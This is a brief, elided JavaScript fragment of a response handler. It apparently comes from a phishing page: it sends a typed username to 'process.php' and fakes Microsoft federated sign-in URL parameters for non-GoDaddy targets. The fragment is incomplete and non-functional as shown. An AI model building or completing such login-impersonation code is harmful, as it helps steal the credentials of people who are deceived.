        ...
        hr1.onreadystatechange = function () {
            if (hr1.readyState == 4 && hr1.status == 200) {
                ...
                if (myObj.code === 3) {
                    ...
                    setTimeout(function () {
						if(redi.includes('godaddy')){window.location.replace("process.php?u=godaddy&user="+USER.value);}
						else{window.location.replace("process.php?&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&u="+btoa(myObj.redirect_url));}
